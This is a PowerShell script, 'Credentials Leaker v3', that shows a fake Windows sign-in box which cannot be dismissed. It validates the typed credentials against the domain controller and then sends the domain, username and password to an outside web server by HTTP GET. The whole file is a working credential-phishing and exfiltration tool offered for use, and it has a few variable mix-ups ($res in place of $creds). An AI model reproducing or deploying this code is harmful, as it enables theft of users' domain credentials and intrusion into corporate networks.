'''
Credentials Leaker v3 By Dviros

This script will display a Windows Security Credentials box that will ask the user for his credentials.

The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC. If its valid, it will close and leak it to a web server outside.

'''
###########################################################################################################

# Prerequisities
Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]

$CurrentDomain_Name = $env:USERDOMAIN
$status = $true


function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}


function Credentials(){
    $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
    $options.AuthenticationProtocol = 0
    $options.Caption = "Sign in"
    $options.Message = "Enter your credentials"
    $options.TargetName = "1"
    while ($status){
        
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if (!$creds.CredentialPassword -or $creds.CredentialPassword -eq $null){
            Credentials
        }
        if (!$creds.CredentialUserName){
            Credentials
        }
        else {
            $Domain = $res.CredentialDomainName;
            $Username = $res.CredentialUserName;
            $Password = $res.CredentialPassword;
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName

            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)

            if ($domain.name -eq $null){
                Credentials
            }
            else {
                try{
                Invoke-WebRequest http://ServerIP:PORT/$CurrentDomain_Name";"$username";"$password -Method Get
                }
                catch{}

                $status = $false
                exit
            }
        }
    }
}


Credentials
